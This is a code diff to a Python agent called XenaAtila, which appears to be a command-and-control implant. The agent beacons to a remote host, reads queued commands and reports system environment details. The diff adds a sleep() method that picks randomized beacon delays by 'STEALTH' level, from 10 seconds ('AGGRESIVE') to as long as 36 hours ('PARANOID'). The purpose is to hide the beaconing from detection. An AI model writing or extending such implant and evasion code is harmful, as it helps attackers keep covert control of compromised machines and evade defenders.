@@ -9,6 +9,7 @@ from requests import post, get
 from uuid import uuid4
 from typing import Union
 from Crypto.PublicKey import RSA
+from random import randint
 
 from services.system import System
 from domains.message import Message
@@ -32,7 +33,7 @@ class XenaAtila:
           break
       except Exception as e:
         logging.debug('Unable to identify for ' + self.remote + ' with the error:' + str(e))
-      sleep(10)
+      self.sleep()
     
     logging.debug('Xena-Atila has been successfuly recognized by ' + self.remote)
 
@@ -40,7 +41,7 @@ class XenaAtila:
     while True:
       messages = self.read_inbox(self.remote)
       print(messages)
-      sleep(10)
+      self.sleep()
 
   def read_inbox(self, remote_host: str) -> Union[Message, None]:
     try:
@@ -154,5 +155,20 @@ class XenaAtila:
       output = json.dumps(System.environment_details())
     
     return str(output)
+  
+  def sleep(self):
+    amount = 0
+    if Env()['STEALTH'] == 'AGGRESIVE':
+      amount = 10
+    if Env()['STEALTH'] == 'PUSHY':
+      amount = randint(600, 1000)
+    if Env()['STEALTH'] == 'NORMAL':
+      amount = randint(3600, 7200)
+    if Env()['STEALTH'] == 'SNEAKY':
+      amount = randint(7200, 28800)
+    if Env()['STEALTH'] == 'PARANOID':
+      amount = randint(28800, 129600)
+    sleep(amount)
+
 
 xena_atila: XenaAtila = XenaAtila()
